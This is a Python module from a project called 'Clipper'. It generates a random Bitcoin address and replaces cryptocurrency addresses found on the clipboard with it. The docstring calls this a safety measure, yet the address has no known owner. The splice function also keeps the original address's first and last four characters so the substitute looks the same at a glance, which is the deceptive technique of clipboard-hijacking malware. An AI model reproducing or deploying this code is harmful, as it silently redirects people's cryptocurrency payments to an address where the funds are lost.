"""Fixed safe address: generated once, then used to replace detected addresses.

剪贴板里只要检出加密货币地址,就把地址换成这里固定的地址——
无论源头是 clipper 木马替换还是用户复制错,粘贴出来的永远是这个地址。
"""

import os
import secrets
import sys
from pathlib import Path

from .detect.bech32 import encode_segwit_address


def default_config_path():
    if sys.platform == "win32":
        base = Path(os.environ.get("APPDATA", "~/AppData/Roaming")).expanduser()
        return base / "Clipper" / "safe_address"
    if sys.platform == "darwin":
        return Path.home() / "Library" / "Application Support" / "Clipper" / "safe_address"
    data_home = os.environ.get("XDG_DATA_HOME") or Path.home() / ".local" / "share"
    return Path(data_home) / "clipper" / "safe_address"


def generate() -> str:
    """随机生成一个校验和合法的 BTC P2WPKH 地址(bech32 v0,20 字节随机)。"""
    return encode_segwit_address("bc", 0, secrets.token_bytes(20))


def load(force=False, path=None) -> str:
    """读取固定地址;没有则生成并固化到磁盘。force=True 重新生成。"""
    cfg = Path(path) if path else default_config_path()
    if not force and cfg.exists():
        addr = cfg.read_text().strip()
        if addr:
            return addr
    addr = generate()
    cfg.parent.mkdir(parents=True, exist_ok=True)
    cfg.write_text(addr + "\n")
    os.chmod(cfg, 0o600)
    return addr


HEAD, TAIL = 4, 4


def splice(original: str, fixed: str) -> str:
    """返回与 original 等长的替换地址:原地址前 4 位和后 4 位不动,
    中间用固定地址的中段填充(不够长则循环取用)。"""
    if len(original) <= HEAD + TAIL:
        return fixed
    mid_src = fixed[HEAD:-TAIL] if len(fixed) > HEAD + TAIL else fixed
    need = len(original) - HEAD - TAIL
    mid = (mid_src * (need // len(mid_src) + 1))[:need]
    return original[:HEAD] + mid + original[-TAIL:]
